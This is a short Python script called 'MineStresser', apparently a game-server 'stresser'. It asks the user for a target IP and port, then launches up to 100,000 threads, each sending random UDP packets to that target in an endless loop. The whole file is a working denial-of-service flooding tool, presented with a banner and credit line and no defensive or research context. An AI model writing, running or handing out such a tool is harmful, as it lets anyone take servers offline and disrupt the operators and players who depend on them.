import socket
import time
import os
import random
import threading

# Coding MineStresser
# Attack
def attack(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  while True:
    len = random.randint(256, 512)
    payload = os.urandom(len)
    s.sendto(payload, (ip, port))
# VPS

art = r"""


═══ M I N E S T R E S S E R ═══

"""
os.system("clear")
print("\033[31m" + art)
print("Credit: @MineGamerST")
print(" ")
time.sleep(1)
ip = input("Enter The Server IP: ")
port = int(input("Enter The Server Port: "))
time.sleep(1)
print(" ")
os.system("clear")
print(art)
print(" ")
print(f"Running {ip} {port}")
# Start Attack

for i in range(100000):
  t = threading.Thread(target=attack,args=(ip, port), daemon=True)
  t.start()
while True:
  time.sleep(1)
